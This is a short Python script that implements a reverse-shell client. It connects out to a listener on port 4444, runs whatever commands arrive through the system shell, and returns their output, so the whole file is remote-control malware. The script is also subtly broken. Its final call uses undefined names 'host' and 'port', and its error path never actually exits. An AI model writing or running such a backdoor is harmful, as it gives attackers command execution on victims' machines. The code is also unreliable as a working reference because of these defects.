import os
import socket 
import subprocess
import sys

def reciever(s):
    while True:
        cmd_bytes = s.recv(4096)
        cmd = cmd_bytes.decode("utf-8")
        if cmd.startswith("cd "):
            os.chdir(cmd[3:])
            s.send(b"$: ")
            continue
        if len(cmd) > 0:
            p = subprocess.run(cmd, shell=True, capture_output=True)
            data = p.stdout + p.stderr
            s.sendall(data + b"$: ")

def connect(address):
    try:
        s = socket.socket()
        s.connect(address)
        print("Connection Established.")
        print(f"Address: {address}")
    except socket.error as error:
        print("An Error Occured")
        print(error)
        sys.exit
    reciever(s)

if __name__ == "__main__":
    RHOST = "127.0.0.1"
    RPORT = 4444 
    connect((host, port))

